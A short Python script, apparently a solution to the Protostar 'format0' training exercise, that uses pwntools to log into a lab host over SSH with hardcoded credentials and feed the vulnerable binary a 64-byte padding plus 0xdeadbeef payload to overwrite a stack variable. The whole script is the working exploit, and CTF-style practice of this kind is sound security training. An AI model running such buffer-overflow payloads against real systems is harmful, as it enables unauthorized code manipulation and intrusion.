from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

bash.sendline('/opt/protostar/bin/format0 $(python -c "from struct import pack; print \'a\'*64 + pack(\'<I\', 0xdeadbeef)")')
print(bash.recvline())